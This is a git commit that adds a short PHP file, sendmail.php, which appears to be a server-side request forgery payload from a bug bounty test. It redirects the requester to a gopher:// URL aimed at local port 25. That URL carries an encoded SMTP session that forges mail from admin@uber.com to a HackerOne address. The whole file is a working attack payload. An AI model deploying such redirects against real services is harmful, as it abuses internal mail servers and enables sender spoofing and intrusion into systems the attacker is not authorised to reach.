65d975d7d799b535047391fae2881e5a01ac2331
Se1wan <MichiBillerbeck@gmail.com>
2021-04-03 18:21:56 +0200

    Add files via upload

---
+++ sendmail.php
@@ -0,0 +1,15 @@
+<?php
+        $commands = array(
+                'HELO uber.com',
+                'MAIL FROM: <admin@uber.com>',
+                'RCPT To: <54v4n7@wearehackerone.com>',
+                'DATA',
+                'Subject: corben!',
+                'Corben (cdl) was here, woot woot!',
+                '.'
+        );
+
+        $payload = implode('%0A', $commands);
+
+        header('Location: gopher://0:25/_'.$payload);
+?>
